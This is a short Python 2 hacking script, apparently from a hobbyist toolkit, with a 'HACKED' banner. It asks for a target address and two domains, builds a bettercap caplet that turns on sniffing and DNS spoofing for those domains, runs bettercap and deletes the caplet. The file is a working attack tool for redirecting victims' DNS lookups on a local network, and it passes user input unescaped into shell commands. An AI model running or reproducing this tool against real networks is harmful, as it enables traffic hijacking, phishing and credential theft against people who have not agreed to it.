#!/usr/local/bin/python
# coding: latin-1
#if you use this code give me credit @tuf_unkn0wn
#i do not give you permission to show / edit this script without my credit
#to ask questions or report a problem message me on instagram @tuf_unkn0wn
"""


 ██░ ██  ▄▄▄       ▄████▄   ██ ▄█▀▓█████ ▓█████▄ 
▓██░ ██▒▒████▄    ▒██▀ ▀█   ██▄█▒ ▓█   ▀ ▒██▀ ██▌
▒██▀▀██░▒██  ▀█▄  ▒▓█    ▄ ▓███▄░ ▒███   ░██   █▌
░▓█ ░██ ░██▄▄▄▄██ ▒▓▓▄ ▄██▒▓██ █▄ ▒▓█  ▄ ░▓█▄   ▌
░▓█▒░██▓ ▓█   ▓██▒▒ ▓███▀ ░▒██▒ █▄░▒████▒░▒████▓ 
 ▒ ▒░▒ ▒▒   ▓▒█ ░▒ ▒  ░▒ ▒▒ ▓▒ ▒░ ░ ▒▒▓  ▒ 
 ▒ ░▒░ ░  ▒   ▒▒ ░  ░  ▒   ░ ░▒ ▒░ ░ ░  ░ ░ ▒  ▒ 
 ░   ░  ░   ▒   ░        ░  ░    ░    ░ ░  ░ 
 ░  ░  ░      ░   ░      ░  ░      ░  ░   ░    
                  ░                       ░      


"""
import os
import sys
import random
lred = '\033[91m'
lblue = '\033[94m'
lgreen = '\033[92m'
yellow = '\033[93m'
cyan = '\033[1;36m'
purple = '\033[95m'
red = '\033[31m'
green = '\033[32m'
blue = '\033[34m'
orange = '\033[33m'

colorlist = [red, blue, green, yellow, lblue, purple, cyan, lred, lgreen, orange]
randomcolor = random.choice(colorlist)
banner3list = [red, blue, green, purple]

def dnsspoof():
	target = raw_input("\033[1mTarget:\033[0m ")
	domain1 = raw_input("\033[1mDomain1:\033[0m ")
	domain2 = raw_input("\033[1mDomain2:\033[0m ")
	os.system('echo "net.sniff on\n" >> dns.cap')
	os.system('echo "set dns.spoof.domains {0},{1}\n" >> dns.cap'.format(domain1,domain2))
	os.system('echo "set dns.spoof.address {0}\n" >> dns.cap'.format(target))
	os.system('echo "dns.spoof on\n" >> dns.cap')
	print '\n\033[93mto stop type "exit"\033[0m'
	os.system("sleep 2")
	os.system("bettercap -no-history -caplet dns.cap")
	os.system("rm dns.cap")

dnsspoof()
